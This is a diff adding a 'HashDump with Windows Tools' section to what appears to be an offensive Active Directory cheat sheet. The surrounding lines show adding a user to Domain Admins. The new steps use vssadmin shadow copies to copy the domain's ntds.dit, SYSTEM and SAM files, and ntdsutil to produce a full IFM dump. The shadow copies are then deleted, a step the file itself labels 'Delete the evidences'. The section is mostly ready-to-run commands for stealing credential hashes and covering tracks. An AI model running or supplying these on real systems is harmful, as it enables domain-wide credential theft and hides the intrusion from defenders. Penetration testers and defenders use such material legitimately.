@@ -91,3 +91,39 @@ C:\Users\User> net groups "Domain Admins" USER /add
 ```cmd
 C:\Users\User> net accounts /domain
 ```
+
+## HashDump with Windows Tools
+
++ **Shadow Copy**
+
+1. Check if there is any Shadow Copy
+```cmd
+vssadmin list shadows
+```
+
+2. Create a Shadow Copy Volume
+```cmd
+vssadmin create shadow /for=X:  //Where X is the HDD where is the el ntds.dit file
+```
+
+3. Copy ntds.dit, SYSYEM and SAM
+```cmd
+copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy[X]\windows\ntds\ntds.dit .
+copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy[X]\windows\system32\config\SYSTEM .
+copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy[X]\windows\system32\config\SAM .
+```
+
+4. Delete the evidences
+```cmd
+vssadmin delete shadows /for=X:
+```
+
++ NTDSUTIL
+```cmd
+C:\>ntdsutil
+ntdsutil: activate instance ntds
+ntdsutil: ifm
+ifm: create full c:\pentest
+ifm: quit
+ntdsutil: quit
+```
